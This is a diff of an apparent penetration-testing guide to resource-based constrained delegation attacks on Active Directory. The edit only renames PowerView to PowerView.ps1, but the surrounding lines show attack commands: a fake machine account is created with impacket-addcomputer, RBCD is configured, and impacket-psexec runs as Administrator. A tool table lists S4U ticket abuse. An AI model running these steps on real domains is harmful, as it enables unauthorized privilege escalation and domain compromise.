@@ -223,10 +223,10 @@ sequenceDiagram
 
 ### 1. Check Permissions
 
-**PowerView (Windows)**
+**PowerView.ps1 (Windows)**
 
 ```powershell
-# Import PowerView
+# Import PowerView.ps1
 Import-Module .\PowerView.ps1
 
 # Check permissions on the target
@@ -311,10 +311,10 @@ impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-
 
 ### 4. Configure RBCD
 
-**PowerView (Windows)**
+**PowerView.ps1 (Windows)**
 
 ```powershell
-# Configure RBCD with PowerView
+# Configure RBCD with PowerView.ps1
 
 # Get the SID of FAKE01$
 $ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -ExpandProperty objectsid
@@ -753,7 +753,7 @@ impacket-psexec -k -no-pass Administrator@web01.corp.local
 
 | Tool | Purpose |
 |---|---|
-| **PowerView** | Permission enumeration and RBCD configuration (Windows) |
+| **PowerView.ps1** | Permission enumeration and RBCD configuration (Windows) |
 | **Impacket rbcd.py** | RBCD configuration (Linux) |
 | **Impacket getST.py** | S4U attack / ticket acquisition |
 | **Rubeus** | S4U attack (Windows) |
